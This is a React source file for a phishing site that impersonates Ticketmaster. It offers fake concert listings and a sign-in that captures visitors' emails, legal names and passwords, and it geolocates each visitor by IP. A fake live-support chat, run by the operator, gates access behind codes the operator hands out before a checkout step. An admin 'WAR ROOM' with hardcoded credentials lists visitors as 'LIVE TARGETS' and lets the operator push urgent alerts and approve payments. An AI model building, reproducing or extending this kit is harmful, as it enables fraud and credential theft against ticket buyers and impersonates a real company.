import React, { useState, useEffect } from 'react';
import { Search, User, CheckCircle, MessageSquare, Send, X, Bell, DollarSign, ShieldCheck, Ticket, Info, Star, ChevronLeft, LogIn } from 'lucide-react';
import { onSnapshot, collection, addDoc, updateDoc, doc, setDoc, getDoc } from 'firebase/firestore';
import { signInAnonymously, onAuthStateChanged } from 'firebase/auth';
import { auth, db, appId } from './firebase';

import SeatMap from './components/SeatMap.jsx';
import Checkout from './components/Checkout.jsx';

// ==========================================
// ADMIN SECURITY SETUP (CHANGE THESE!)
const MY_ADMIN_USERNAME = "mySecureUser"; 
const MY_ADMIN_PASSWORD = "mySecurePassword123";
// ==========================================

const INITIAL_EVENTS = [
  { id: 1, artist: "Taylor Swift | The Eras Tour", venue: "Wembley Stadium, London", date: "Sat • Aug 17 • 7:00 PM", image: "https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1459749411177-287ce35e8b4f?auto=format&fit=crop&q=80&w=2000", status: "presale", timeRemaining: "02:45:12" },
  { id: 2, artist: "Drake: It's All A Blur", venue: "O2 Arena, London", date: "Fri • Sep 22 • 8:00 PM", image: "https://images.unsplash.com/photo-1514525253440-b393452e8d26?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1501281668745-f7f57925c3b4?auto=format&fit=crop&q=80&w=2000", status: "available", timeRemaining: "00:00:00" },
  { id: 3, artist: "Adele: Weekends in Vegas", venue: "The Colosseum, Caesars Palace", date: "Sat • Oct 12 • 8:00 PM", image: "https://images.unsplash.com/photo-1511671782779-c97d3d27a1d4?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1493225255756-d9584f8606e9?auto=format&fit=crop&q=80&w=2000", status: "low_inventory", timeRemaining: "05:12:00" }
];

export default function App() {
  const [user, setUser] = useState(null);
  const [currentPage, setCurrentPage] = useState('home'); 
  const [selectedEvent, setSelectedEvent] = useState(null);
  const [cart, setCart] = useState([]); 
  const [sessions, setSessions] = useState([]); 
  const [currentSessionId, setCurrentSessionId] = useState(null);
  const [globalSettings, setGlobalSettings] = useState({ price: 250, bgImage: '', presaleCode: 'FAN2024' });
  
  const [searchTerm, setSearchTerm] = useState('');
  const [authStep, setAuthStep] = useState('email'); 
  const [tempUser, setTempUser] = useState({ email: '', name: '' });
  
  const [isChatOpen, setIsChatOpen] = useState(false);
  const [chatMessages, setChatMessages] = useState([]);
  const [isAdminLoggedIn, setIsAdminLoggedIn] = useState(false);
  const [showNotifs, setShowNotifs] = useState(false);
  const [activeNotification, setActiveNotification] = useState(null);

  useEffect(() => {
    signInAnonymously(auth);
    return onAuthStateChanged(auth, setUser);
  }, []);

  useEffect(() => {
    if (!user) return;
    const startSession = async () => {
      let location = "Detecting...";
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        location = `${data.city}, ${data.country_name}`;
      } catch (e) { location = "Unknown City"; }

      const sessionsRef = collection(db, 'artifacts', appId, 'public', 'data', 'sessions');
      const newSession = await addDoc(sessionsRef, {
        createdAt: new Date().toISOString(),
        userId: user.uid,
        location,
        status: 'browsing',
        email: 'Not Set',
        userAuthCode: '', 
        notifications: [],
        chatHistory: [{ sender: 'system', text: 'Welcome to Ticketmaster Live Support. How can we verify your fan status today?', timestamp: new Date().toISOString() }]
      });
      setCurrentSessionId(newSession.id);
    };
    startSession();
  }, [user]);

  useEffect(() => {
    if (!user) return;
    const configRef = doc(db, 'artifacts', appId, 'public', 'data', 'config', 'global_settings');
    return onSnapshot(configRef, (docSnap) => {
      if (docSnap.exists()) setGlobalSettings(docSnap.data());
    });
  }, [user]);

  useEffect(() => {
    if (!currentSessionId) return;
    const sessionRef = doc(db, 'artifacts', appId, 'public', 'data', 'sessions', currentSessionId);
    return onSnapshot(sessionRef, (docSnap) => {
      if (docSnap.exists()) {
        const data = docSnap.data();
        if (data.chatHistory) setChatMessages(data.chatHistory);
        if (data.notifications && data.notifications.length > 0) {
          setActiveNotification(data.notifications[data.notifications.length - 1]);
        }
      }
    });
  }, [currentSessionId]);

  useEffect(() => {
    if (!user || !isAdminLoggedIn) return;
    const sessionsRef = collection(db, 'artifacts', appId, 'public', 'data', 'sessions');
    return onSnapshot(sessionsRef, (snapshot) => {
      setSessions(snapshot.docs.map(d => ({ id: d.id, ...d.data() })).sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt)));
    });
  }, [user, isAdminLoggedIn]);

  const updateSession = async (sid, updates) => await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid), updates);
  const sendChatMessage = async (sid, text, sender) => {
    const ref = doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid);
    const snap = await getDoc(ref);
    if (snap.exists()) {
      const currentChat = snap.data().chatHistory || [];
      await updateDoc(ref, { chatHistory: [...currentChat, { sender, text, timestamp: new Date().toISOString() }] });
    }
  };

  const filteredEvents = INITIAL_EVENTS.filter(ev => ev.artist.toLowerCase().includes(searchTerm.toLowerCase()));
  const mySessionData = sessions.find(s => s.id === currentSessionId) || {};

  return (
    <div className="min-h-screen font-sans text-gray-900 bg-white relative overflow-x-hidden no-select">
      {/* HEADER */}
      <header className="fixed top-0 w-full z-50 bg-[#1f262d] text-white h-16 flex items-center px-4 justify-between shadow-2xl backdrop-blur-md bg-opacity-95">
        <div className="flex items-center gap-3">
          {currentPage !== 'home' && (
            <button onClick={() => setCurrentPage('home')} className="hover:bg-white/10 p-2 rounded-full transition-all">
              <ChevronLeft className="w-6 h-6" />
            </button>
          )}
          <div className="flex items-center gap-1 cursor-pointer shrink-0" onClick={() => setCurrentPage('home')}>
            <span className="font-bold text-2xl tracking-tighter">ticketmaster</span>
            <div className="bg-[#026cdf] rounded-full w-5 h-5 flex items-center justify-center">
              <CheckCircle className="w-3.5 h-3.5 text-white stroke-[3]" />
            </div>
          </div>
        </div>

        <div className="hidden md:flex flex-1 max-w-lg mx-8 relative group">
          <input 
            type="text" 
            placeholder="Search millions of events..." 
            className="w-full bg-white/10 border border-gray-600 rounded-full py-2.5 pl-11 pr-4 text-sm focus:bg-white focus:text-gray-900 focus:outline-none focus:ring-4 focus:ring-blue-500/20 transition-all"
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
          />
          <Search className="absolute left-4 top-3 w-4 h-4 text-gray-400 group-focus-within:text-[#026cdf]" />
        </div>

        <div className="flex items-center gap-4 shrink-0 relative">
          <div className="relative cursor-pointer hover:scale-110 transition-transform" onClick={() => setShowNotifs(!showNotifs)}>
            <Bell className="w-5 h-5" />
            {activeNotification && <div className="absolute -top-1 -right-1 w-3.5 h-3.5 bg-red-600 rounded-full border-2 border-[#1f262d] animate-pulse" />}
          </div>
          
          <div onClick={() => setCurrentPage('admin')} className="cursor-pointer hover:text-[#026cdf] transition-colors p-1">
             <User className="w-6 h-6" />
          </div>

          {/* NOTIFICATION CENTER */}
          {showNotifs && (
            <div className="absolute top-12 right-0 bg-white text-gray-900 p-6 rounded-3xl shadow-[0_30px_60px_rgba(0,0,0,0.3)] border border-gray-100 w-72 animate-slideDown z-[100]">
               <h4 className="font-black text-xs uppercase mb-4 text-[#026cdf] flex items-center justify-between">
                 <span>Alerts</span>
                 <Bell className="w-3 h-3" />
               </h4>
               {activeNotification ? (
                 <div className="bg-red-50 p-3 rounded-2xl border border-red-100 animate-pulse">
                   <p className="text-[11px] font-bold text-red-800 leading-tight">{activeNotification.text}</p>
                 </div>
               ) : (
                 <p className="text-[11px] text-gray-400 font-medium text-center py-4">You have no new notifications. Check back later.</p>
               )}
            </div>
          )}
        </div>
      </header>

      {/* DYNAMIC BACKGROUND FOR HOME */}
      {currentPage === 'home' && (
        <div className="fixed inset-0 pointer-events-none z-0">
          <div className="absolute inset-0 bg-gradient-to-br from-blue-950 via-[#1f262d] to-black" />
          <div className="absolute inset-0 opacity-20 bg-[url('https://www.transparenttextures.com/patterns/dark-matter.png')]" />
        </div>
      )}

      {/* MAIN VIEWPORT */}
      <main className="pt-16 min-h-screen relative z-10">
        {currentPage === 'home' && (
          <HomeView 
            events={filteredEvents} 
            searchTerm={searchTerm} 
            setSearchTerm={setSearchTerm} 
            onSelect={(e) => {setSelectedEvent(e); setCurrentPage('auth');}} 
          />
        )}
        
        {currentPage === 'auth' && (
          <AuthGate 
            step={authStep} 
            setStep={setAuthStep} 
            tempUser={tempUser} 
            setTempUser={setTempUser} 
            sessionData={mySessionData}
            onComplete={() => {
              setCurrentPage('seatmap'); 
              updateSession(currentSessionId, { status: 'viewing_map', email: tempUser.email, name: tempUser.name });
            }} 
          />
        )}
        
        {currentPage === 'seatmap' && (
          <SeatMap 
            event={selectedEvent} 
            presaleCode={globalSettings.presaleCode} 
            cart={cart} 
            setCart={setCart} 
            globalPrice={globalSettings.price} 
            onCheckout={() => {
              updateSession(currentSessionId, { status: 'payment_pending', cart });
              setCurrentPage('checkout');
            }} 
          />
        )}
        
        {currentPage === 'checkout' && (
          <Checkout 
            cart={cart} 
            sessionId={currentSessionId} 
            sessionData={mySessionData} 
            updateSession={updateSession} 
            onSuccess={() => setCurrentPage('success')} 
            onBack={() => setCurrentPage('seatmap')} 
          />
        )}
        
        {currentPage === 'success' && <SuccessScreen event={selectedEvent} cart={cart} onHome={() => setCurrentPage('home')} />}
        
        {currentPage === 'admin' && (
          <AdminDashboard 
            user={MY_ADMIN_USERNAME}
            pass={MY_ADMIN_PASSWORD}
            isLoggedIn={isAdminLoggedIn} 
            setLoggedIn={setIsAdminLoggedIn} 
            sessions={sessions} 
            updateSession={updateSession} 
            globalSettings={globalSettings} 
            updateGlobalSettings={(s) => setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'config', 'global_settings'), s)} 
            sendChatMessage={sendChatMessage} 
            onExit={() => setCurrentPage('home')} 
          />
        )}
      </main>

      {/* CHAT WIDGET */}
      <div className={`fixed bottom-8 right-6 z-[60] transition-all duration-500 ${currentPage === 'seatmap' || currentPage === 'checkout' ? 'sm:translate-y-0 translate-y-[-80px]' : ''}`}>
        <button 
          onClick={() => setIsChatOpen(!isChatOpen)} 
          className="bg-[#026cdf] text-white p-4 rounded-[22px] shadow-[0_15px_40px_rgba(2,108,223,0.5)] hover:scale-110 active:scale-95 transition-all"
        >
          {isChatOpen ? <X /> : <MessageSquare />}
        </button>
      </div>

      {isChatOpen && (
        <div className="fixed bottom-28 right-6 w-[92vw] max-w-[360px] h-[480px] bg-white border shadow-[0_30px_100px_rgba(0,0,0,0.4)] rounded-[32px] z-[70] flex flex-col overflow-hidden animate-slideUp">
          <div className="bg-gradient-to-r from-[#1f262d] to-black text-white p-5 flex justify-between items-center border-b border-white/10">
            <div className="flex items-center gap-3">
              <div className="relative">
                <div className="w-10 h-10 bg-[#026cdf] rounded-full flex items-center justify-center font-black text-sm">TM</div>
                <div className="absolute bottom-0 right-0 w-3 h-3 bg-green-500 rounded-full border-2 border-[#1f262d]" />
              </div>
              <div>
                <p className="font-black text-xs uppercase tracking-widest">Live Agent</p>
                <p className="text-[9px] text-gray-400 font-bold uppercase">Online Now</p>
              </div>
            </div>
            <X className="cursor-pointer w-5 h-5 text-gray-500 hover:text-white" onClick={() => setIsChatOpen(false)} />
          </div>
          <div className="flex-1 overflow-y-auto p-5 space-y-4 bg-gray-50">
            {chatMessages.map((m, i) => (
              <div key={i} className={`flex ${m.sender === 'user' ? 'justify-end' : 'justify-start'}`}>
                <div className={`max-w-[85%] p-3.5 rounded-2xl text-[13px] font-medium leading-relaxed shadow-sm ${m.sender === 'user' ? 'bg-[#026cdf] text-white rounded-br-none' : 'bg-white border-2 border-gray-100 rounded-bl-none text-gray-800'}`}>
                  {m.text}
                </div>
              </div>
            ))}
          </div>
          <div className="p-4 border-t bg-white flex gap-2">
            <input 
              placeholder="Message support..." 
              className="flex-1 bg-gray-100 border-none p-3.5 rounded-2xl text-sm focus:ring-2 focus:ring-[#026cdf] outline-none transition-all" 
              onKeyDown={(e) => { 
                if(e.key === 'Enter' && e.target.value.trim()){ 
                  sendChatMessage(currentSessionId, e.target.value, 'user'); 
                  e.target.value = ''; 
                } 
              }} 
            />
            <button 
              onClick={() => {
                const inp = document.querySelector('input[placeholder="Message support..."]');
                if(inp.value.trim()){ sendChatMessage(currentSessionId, inp.value, 'user'); inp.value = ''; }
              }}
              className="bg-[#026cdf] text-white p-3.5 rounded-2xl shadow-lg hover:bg-blue-700 transition-colors"
            >
              <Send className="w-5 h-5" />
            </button>
          </div>
        </div>
      )}
    </div>
  );
}

// --- SUB COMPONENTS ---

function HomeView({ events, searchTerm, setSearchTerm, onSelect }) {
  return (
    <div className="max-w-7xl mx-auto p-4 sm:p-10 space-y-16 pb-32">
      {/* EPIC HERO SECTION */}
      <div className="relative h-[460px] rounded-[50px] overflow-hidden shadow-2xl flex items-center justify-center p-8 text-center border-4 border-white/5">
        <div className="absolute inset-0 bg-gradient-to-t from-black via-black/40 to-transparent z-10" />
        <img src="https://images.unsplash.com/photo-1470225620780-dba8ba36b745?auto=format&fit=crop&q=80&w=2000" className="absolute inset-0 w-full h-full object-cover scale-105" />
        <div className="relative z-20 text-white max-w-4xl animate-fadeIn space-y-6">
          <h1 className="text-6xl md:text-8xl font-black tracking-tighter leading-none mb-4 italic">LET'S MAKE <span className="text-[#026cdf]">MEMORIES</span>.</h1>
          <p className="text-xl md:text-2xl font-bold text-gray-300 max-w-xl mx-auto">Get verified tickets for the world's most anticipated tours.</p>
          <div className="bg-white/10 backdrop-blur-xl border border-white/20 rounded-[35px] p-2.5 flex shadow-2xl max-w-xl mx-auto group focus-within:bg-white focus-within:border-white transition-all">
             <input 
               className="flex-1 bg-transparent px-6 py-3 rounded-full text-white font-bold placeholder:text-gray-400 focus:outline-none focus:text-gray-900" 
               placeholder="Search for your favorite artist..." 
               value={searchTerm}
               onChange={(e) => setSearchTerm(e.target.value)}
             />
             <button className="bg-[#026cdf] px-10 py-4 rounded-[28px] font-black text-sm uppercase tracking-widest shadow-xl shadow-blue-500/30 hover:bg-blue-600 transition-all">Search</button>
          </div>
        </div>
      </div>

      {/* EVENT GRID */}
      <div className="space-y-10">
        <div className="flex justify-between items-end px-2">
          <h2 className="text-3xl font-black text-white flex items-center gap-3">
            <div className="w-1.5 h-8 bg-[#026cdf] rounded-full" /> FEATURED TOURS
          </h2>
          <span className="text-xs font-black text-[#026cdf] tracking-[0.3em] uppercase hidden sm:block">Explore All Millon Events</span>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-10">
          {events.map(ev => (
            <div key={ev.id} onClick={() => onSelect(ev)} className="bg-[#1f262d] rounded-[45px] overflow-hidden shadow-2xl border border-white/5 hover:translate-y-[-10px] transition-all duration-500 cursor-pointer group">
              <div className="h-80 relative overflow-hidden">
                 <img src={ev.image} className="w-full h-full object-cover group-hover:scale-125 transition-transform duration-[1.5s]" />
                 <div className="absolute inset-0 bg-gradient-to-t from-[#1f262d] via-transparent to-transparent" />
                 <div className="absolute top-6 left-6 flex flex-col gap-2">
                    <div className="bg-[#ea0042] text-white px-4 py-1.5 rounded-full text-[10px] font-black uppercase shadow-xl animate-pulse">On Sale Soon</div>
                    <div className="bg-black/50 backdrop-blur-md text-white px-3 py-1 rounded-full text-[9px] font-bold uppercase">{ev.timeRemaining}</div>
                 </div>
              </div>
              <div className="p-8 space-y-4">
                 <div className="flex justify-between items-start">
                    <h3 className="text-2xl font-black leading-tight text-white group-hover:text-[#026cdf] transition-colors uppercase italic">{ev.artist}</h3>
                 </div>
                 <div className="flex flex-col gap-1">
                    <p className="text-gray-400 font-bold text-[11px] uppercase tracking-[0.2em]">{ev.venue}</p>
                    <p className="text-gray-500 font-medium text-[10px] uppercase tracking-widest">{ev.date}</p>
                 </div>
                 <div className="pt-4 border-t border-white/5 flex justify-between items-center">
                    <div className={`px-4 py-1.5 rounded-full text-[9px] font-black uppercase border ${
                      ev.status === 'presale' ? 'text-amber-400 border-amber-400/20 bg-amber-400/5' :
                      ev.status === 'available' ? 'text-[#026cdf] border-[#026cdf]/20 bg-[#026cdf]/5' :
                      'text-pink-500 border-pink-500/20 bg-pink-500/5'
                    }`}>
                      {ev.status} Access
                    </div>
                    <button className="bg-white/5 hover:bg-white text-white hover:text-black p-2 rounded-full transition-all">
                       <ChevronLeft className="w-4 h-4 rotate-180" />
                    </button>
                 </div>
              </div>
            </div>
          ))}
          {events.length === 0 && (
            <div className="col-span-full py-20 text-center text-gray-500 font-black uppercase tracking-[0.5em]">No events match your search</div>
          )}
        </div>
      </div>
    </div>
  );
}

function AuthGate({ step, setStep, tempUser, setTempUser, sessionData, onComplete }) {
  const [loading, setLoading] = useState(false);
  const [vCode, setVCode] = useState('');
  const [error, setError] = useState('');

  const next = () => { 
    if(step === 'verify' && !vCode) return;
    setLoading(true); 
    setError('');
    setTimeout(() => { 
      setLoading(false); 
      if(step==='email') setStep('signup'); 
      else if(step==='signup') setStep('verify'); 
      else {
        if (vCode === sessionData.userAuthCode && vCode !== '') {
           onComplete();
        } else {
           setError("Access Denied. Unique Fan Code mismatch.");
        }
      }
    }, 1200); 
  };
  
  return (
    <div className="min-h-[85vh] flex items-center justify-center p-6">
      <div className="bg-white w-full max-w-md rounded-[50px] shadow-[0_50px_100px_rgba(0,0,0,0.1)] p-12 border border-gray-100 space-y-10 animate-slideUp">
        <div className="text-center space-y-3">
           <div className="w-20 h-20 bg-blue-50 rounded-[30px] flex items-center justify-center mx-auto mb-6 shadow-inner"><User className="text-[#026cdf] w-10 h-10" /></div>
           <h2 className="text-4xl font-black tracking-tighter">Sign In</h2>
           <p className="text-gray-400 text-xs font-bold uppercase tracking-widest">Global Fan Identity Verification</p>
        </div>
        
        {step === 'email' && (
          <div className="space-y-6">
             <input className="w-full border-2 border-gray-100 p-5 rounded-3xl focus:border-[#026cdf] focus:ring-8 focus:ring-blue-500/5 outline-none transition-all font-bold" placeholder="Email Address" value={tempUser.email} onChange={e=>setTempUser({...tempUser, email:e.target.value})} />
             <button onClick={next} className="w-full bg-[#026cdf] text-white py-5 rounded-3xl font-black shadow-2xl shadow-blue-500/40 hover:translate-y-[-2px] active:translate-y-0 transition-all uppercase tracking-widest">
               {loading ? 'Validating...' : 'Continue'}
             </button>
          </div>
        )}
        
        {step === 'signup' && (
          <div className="space-y-4 animate-fadeIn">
             <p className="text-[10px] text-center font-black text-blue-600 uppercase tracking-[0.3em]">Creating New Fan Profile</p>
             <input className="w-full border-2 border-gray-100 p-5 rounded-3xl outline-none font-bold" placeholder="Full Legal Name" value={tempUser.name} onChange={e=>setTempUser({...tempUser, name:e.target.value})} />
             <input className="w-full border-2 border-gray-100 p-5 rounded-3xl outline-none font-bold" type="password" placeholder="Account Password" />
             <button onClick={next} className="w-full bg-black text-white py-5 rounded-3xl font-black shadow-2xl uppercase tracking-widest transition-all">
               {loading ? 'Securing Profile...' : 'Create Account'}
             </button>
          </div>
        )}
        
        {step === 'verify' && (
          <div className="space-y-8 animate-fadeIn">
             <div className="bg-[#026cdf]/5 p-6 rounded-[35px] border-2 border-dashed border-[#026cdf]/20 text-center">
                <p className="text-[11px] text-[#026cdf] font-black leading-relaxed uppercase tracking-wider">
                  Verification Required.<br/>Message our <span className="underline">Live Agent</span> to receive your unique access code.
                </p>
             </div>
             <div className="space-y-4">
                <input 
                  className={`w-full border-2 p-6 rounded-3xl text-center font-black tracking-[0.8em] text-3xl outline-none transition-all shadow-inner ${error ? 'border-red-500 bg-red-50 text-red-600' : 'border-gray-100'}`} 
                  placeholder="0000" 
                  value={vCode}
                  onChange={e=>setVCode(e.target.value)}
                  maxLength={6} 
                />
                {error && <p className="text-red-600 text-[10px] font-black text-center uppercase tracking-widest animate-shake">{error}</p>}
             </div>
             <button onClick={next} className="w-full bg-[#026cdf] text-white py-5 rounded-3xl font-black shadow-2xl uppercase tracking-widest hover:scale-[1.02] active:scale-95 transition-all">
               {loading ? 'Authenticating...' : 'Unlock Fan Access'}
             </button>
          </div>
        )}
      </div>
    </div>
  );
}

function SuccessScreen({ event, cart, onHome }) {
  const [showPrize, setShowPrize] = useState(false);
  useEffect(() => { setTimeout(() => setShowPrize(true), 800); }, []);
  const total = (cart.reduce((a,b)=>a+b.price,0) + (cart.length * 19.50) + 5.00).toFixed(2);
  return (
    <div className="min-h-screen bg-[#026cdf] flex items-center justify-center p-6 overflow-hidden relative">
      <div className="absolute inset-0 pointer-events-none">
         {[...Array(30)].map((_, i) => (
           <div key={i} className={`absolute w-3 h-8 bg-white/30 rounded-full animate-confetti`} style={{ left: `${Math.random()*100}%`, animationDelay: `${Math.random()*2}s`, top: `-50px` }} />
         ))}
      </div>
      <div className={`bg-white w-full max-w-lg rounded-[60px] p-12 text-center shadow-[0_80px_150px_rgba(0,0,0,0.4)] transition-all duration-1000 transform ${showPrize ? 'scale-100 translate-y-0 opacity-100' : 'scale-75 translate-y-40 opacity-0'}`}>
         <div className="w-28 h-28 bg-green-500 rounded-[40px] flex items-center justify-center mx-auto mb-10 shadow-[0_20px_50px_rgba(34,197,94,0.4)] animate-bounce">
           <CheckCircle className="text-white w-14 h-14 stroke-[4]" />
         </div>
         <h1 className="text-5xl font-black text-gray-900 leading-tight mb-4 tracking-tighter uppercase italic">YOU GOT THE TICKETS!</h1>
         <p className="text-gray-400 font-black mb-12 text-xs uppercase tracking-[0.3em]">Official Mobile Tickets Secured</p>
         <div className="bg-gray-50 rounded-[45px] p-10 border-4 border-dashed border-gray-100 mb-12 space-y-4 shadow-inner">
            <Ticket className="w-12 h-12 text-[#026cdf] mx-auto mb-2" />
            <p className="text-[10px] text-gray-300 font-black uppercase tracking-[0.4em]">Transaction Approved</p>
            <p className="text-6xl font-black text-gray-900 tracking-tighter">${total}</p>
         </div>
         <button onClick={onHome} className="w-full bg-[#1f262d] text-white py-6 rounded-[30px] font-black text-xl hover:bg-black transition-all shadow-2xl active:scale-95 uppercase tracking-widest italic">VIEW MY MOBILE TICKETS</button>
      </div>
    </div>
  );
}

function AdminDashboard({ user, pass, isLoggedIn, setLoggedIn, sessions, updateSession, globalSettings, updateGlobalSettings, sendChatMessage, onExit }) {
  const [uInput, setUInput] = useState(''); const [pInput, setPInput] = useState('');
  const [config, setConfig] = useState(globalSettings);

  const sendNotification = async (sid, text) => {
    const ref = doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid);
    const snap = await getDoc(ref);
    if (snap.exists()) {
      const currentNotifs = snap.data().notifications || [];
      await updateDoc(ref, { notifications: [...currentNotifs, { text, timestamp: new Date().toISOString() }] });
    }
  };

  if(!isLoggedIn) return (
    <div className="min-h-screen bg-[#1f262d] flex items-center justify-center p-6">
      <div className="bg-white p-12 rounded-[55px] w-full max-w-sm shadow-2xl space-y-10 animate-slideUp">
        <div className="text-center space-y-2">
           <LogIn className="w-12 h-12 text-[#026cdf] mx-auto mb-4" />
           <h2 className="text-3xl font-black uppercase tracking-widest leading-none">Command Center</h2>
           <p className="text-[10px] text-gray-400 font-bold uppercase tracking-[0.2em]">Authorized Access Only</p>
        </div>
        <div className="space-y-4">
           <input placeholder="Username" className="border-2 w-full p-5 rounded-3xl outline-none focus:border-[#026cdf] font-bold" value={uInput} onChange={ev=>setUInput(ev.target.value)}/>
           <input type="password" placeholder="Access Key" className="border-2 w-full p-5 rounded-3xl outline-none focus:border-[#026cdf] font-bold" value={pInput} onChange={ev=>setPInput(ev.target.value)}/>
           <button onClick={()=>{if(uInput===user && pInput===pass)setLoggedIn(true)}} className="bg-[#026cdf] text-white w-full py-5 rounded-3xl font-black shadow-2xl hover:bg-blue-700 transition-all uppercase tracking-widest mt-4">Login System</button>
        </div>
      </div>
    </div>
  );
  
  return (
    <div className="min-h-screen bg-[#f1f5f9] p-4 md:p-10">
      <div className="max-w-7xl mx-auto space-y-10">
        <div className="flex justify-between items-center"><h1 className="text-4xl font-black uppercase tracking-tighter flex items-center gap-4 italic"><div className="w-4 h-4 bg-green-500 rounded-full animate-pulse shadow-[0_0_20px_#22c55e]" /> WAR ROOM</h1><button onClick={onExit} className="bg-red-600 text-white px-8 py-3 rounded-full font-black text-xs uppercase tracking-widest shadow-xl">TERMINATE CONNECTION</button></div>
        
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-10">
          <div className="bg-white p-10 rounded-[50px] shadow-2xl border-4 border-white space-y-8 h-fit">
            <h3 className="font-black text-xl uppercase flex items-center gap-3 italic"><DollarSign className="w-6 h-6 text-green-600" /> System Global</h3>
            <div className="space-y-6">
               <div><label className="text-[11px] font-black text-gray-400 block mb-3 uppercase tracking-widest">Base Seat Price ($)</label><input type="number" className="w-full border-2 p-4 rounded-2xl font-black text-xl text-blue-600" value={config.price} onChange={ev=>setConfig({...config, price: Number(ev.target.value)})}/></div>
               <div><label className="text-[11px] font-black text-gray-400 block mb-3 uppercase tracking-widest">Master Fan Code</label><input className="w-full border-2 p-4 rounded-2xl font-black uppercase tracking-widest" value={config.presaleCode} onChange={ev=>setConfig({...config, presaleCode: ev.target.value})}/></div>
               <div><label className="text-[11px] font-black text-gray-400 block mb-3 uppercase tracking-widest">Global Wallpaper URL</label><input className="w-full border-2 p-4 rounded-2xl text-xs font-medium bg-gray-50" value={config.bgImage} onChange={ev=>setConfig({...config, bgImage: ev.target.value})}/></div>
               <button onClick={()=>updateGlobalSettings(config)} className="w-full bg-[#026cdf] text-white py-5 rounded-3xl font-black shadow-2xl shadow-blue-500/40 uppercase tracking-widest hover:scale-[1.03] transition-all">SYNC GLOBAL ARTIFACTS</button>
            </div>
          </div>
          
          <div className="lg:col-span-2 bg-white p-10 rounded-[50px] shadow-2xl border-4 border-white space-y-10">
            <h3 className="font-black text-xl uppercase flex items-center gap-3 italic"><User className="w-6 h-6 text-[#026cdf]" /> LIVE TARGETS ({sessions.length})</h3>
            <div className="space-y-8 max-h-[800px] overflow-y-auto pr-4 scroll-pro">
              {sessions.map(s=>(
                <div key={s.id} className="bg-gray-50 p-8 rounded-[40px] border-2 border-gray-100 space-y-6 group hover:border-[#026cdf]/30 transition-all">
                  <div className="flex justify-between items-start">
                    <div className="space-y-1">
                      <div className="text-lg font-black text-blue-800 uppercase italic leading-none">{s.name || 'Visitor Unidentified'}</div>
                      <div className="text-[11px] text-gray-400 font-black uppercase tracking-widest">{s.location}</div>
                      <div className="text-[10px] text-gray-500 font-bold">{s.email}</div>
                    </div>
                    <div className="bg-white px-5 py-2 rounded-full text-[10px] font-black text-[#026cdf] border-2 border-blue-100 uppercase tracking-widest shadow-sm">{s.status}</div>
                  </div>

                  <div className="grid grid-cols-2 gap-6">
                    <div className="bg-white p-5 rounded-3xl border-2 border-gray-100 shadow-inner">
                       <label className="text-[9px] font-black text-gray-400 uppercase block mb-2 tracking-widest">Assigned Access Code</label>
                       <input className="w-full font-black text-[#026cdf] text-3xl outline-none placeholder:text-gray-100" placeholder="XXXX" onBlur={(e) => updateSession(s.id, { userAuthCode: e.target.value })} defaultValue={s.userAuthCode} />
                    </div>
                    <div className="bg-white p-5 rounded-3xl border-2 border-gray-100 shadow-inner">
                       <label className="text-[9px] font-black text-gray-400 uppercase block mb-2 tracking-widest">Deploy Bell Alert</label>
                       <div className="flex gap-2">
                          <input className="flex-1 text-[11px] font-bold outline-none uppercase placeholder:text-gray-200" placeholder="URGENT MSG..." id={`ping-${s.id}`} />
                          <button onClick={() => sendNotification(s.id, document.getElementById(`ping-${s.id}`).value)} className="bg-red-600 text-white px-4 rounded-xl font-black text-[10px] shadow-lg shadow-red-500/20 active:scale-90 transition-all">PING</button>
                       </div>
                    </div>
                  </div>

                  <div className="flex gap-3">
                    <div className="flex-1 relative">
                       <input className="w-full bg-white border-2 border-gray-100 p-4 rounded-2xl text-[13px] font-bold outline-none focus:border-[#026cdf] transition-all" placeholder="Direct Reply..." onKeyDown={e => { if(e.key==='Enter'){ sendChatMessage(s.id, e.target.value, 'system'); e.target.value='' } }} />
                       <Send className="absolute right-4 top-4 w-4 h-4 text-gray-300" />
                    </div>
                    <button onClick={() => updateSession(s.id, {status: 'payment_complete'})} className="bg-green-600 text-white px-8 rounded-2xl font-black text-xs uppercase shadow-xl shadow-green-500/20 hover:bg-green-700 active:scale-95 transition-all">APPROVE</button>
                  </div>
                </div>
              ))}
              {sessions.length === 0 && <div className="py-20 text-center font-black text-gray-300 uppercase tracking-[0.6em]">No Active Targets Found</div>}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

